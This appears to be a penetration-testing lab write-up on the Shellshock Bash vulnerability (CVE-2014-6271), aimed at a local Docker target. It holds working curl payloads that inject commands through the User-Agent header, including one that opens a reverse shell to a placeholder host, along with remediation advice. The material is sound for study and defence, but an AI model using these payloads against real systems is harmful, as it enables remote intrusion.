# GNU Bash Shellshock Environment Variable RCE (CVE-2014-6271)

## Overview

Shellshock (CVE-2014-6271) is a critical remote code execution vulnerability in GNU Bash affecting versions up to 4.3. Discovered in September 2014, Shellshock earned a maximum CVSS 10.0 score due to its ubiquitous presence across Linux/UNIX web servers, embedded network appliances, and SSH services.

The vulnerability stems from how Bash parses function definitions passed via environment variables. When Bash initializes, it imports environment variables. If an environment variable begins with the literal character sequence `() { :;};`, Bash interprets the string as a function definition. Due to a parser flaw, Bash did not stop parsing after the trailing curly brace `}`, continuing to execute any trailing shell commands immediately upon startup. Because web servers utilizing the Common Gateway Interface (CGI) export client HTTP request headers (like `User-Agent`, `Referer`, or `Cookie`) directly into CGI script environment variables (`HTTP_USER_AGENT`), an unauthenticated attacker can achieve immediate Remote Code Execution simply by sending a crafted HTTP header.

- **Primary Interface**: `http://localhost:8137`
- **Vulnerable CGI Endpoint**: `http://localhost:8137/victim.cgi`
- **Docker Shortcut**: `./lab start shellshock`
- **Container Name**: `cyberlab_02_shellshock`
- **RAM Footprint**: ~40 MB (Apache + Bash 4.3.0)

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via Curl
Send a request containing the Shellshock header payload targeting the CGI endpoint:

```bash
curl -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; /bin/id" \
  http://localhost:8137/victim.cgi
```

The server immediately evaluates the injected command and returns:
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 2. Dumping System Information & Environment
```bash
curl -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; uname -a; cat /etc/issue" \
  http://localhost:8137/victim.cgi
```

### 3. Spawning Reverse Shell
```bash
curl -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/HOST_IP/4444 0>&1'" \
  http://localhost:8137/victim.cgi
```

---

## Defensive Remediation & Hardening

1. **Upgrade GNU Bash**:
   Patch systems to Bash versions with fixes for CVE-2014-6271 and subsequent parser bypasses (CVE-2014-7169). Patched Bash versions enforce strict prefixes for exported functions (`BASH_FUNC_foo%%`).
2. **Deprecate Legacy CGI Scripts**:
   Migrate from legacy shell/Perl CGI execution to modern application servers (FastCGI, WSGI, reverse-proxied containers) that do not spawn subshells for request handling.

---

## Video Walkthroughs & Technical References

- [Pentester Lab: CVE-2014-6271: ShellShock | VULNHUB](https://www.youtube.com/watch?v=l-auOrWEr88)
- [NIST NVD CVE-2014-6271 Vulnerability Details](https://nvd.nist.gov/vuln/detail/cve-2014-6271)
- [Vulhub Bash Shellshock Advisory](https://vulhub.org/#/environments/bash/CVE-2014-6271/)
